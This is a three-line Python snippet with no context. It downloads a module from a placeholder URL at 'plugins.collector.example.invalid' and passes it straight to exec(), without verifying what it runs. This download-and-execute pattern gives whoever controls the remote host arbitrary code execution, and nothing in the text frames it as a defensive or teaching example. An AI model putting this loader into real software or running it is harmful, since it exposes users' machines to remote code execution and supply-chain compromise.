import urllib.request
code = urllib.request.urlopen('https://plugins.collector.example.invalid/mod.py').read()
exec(code)
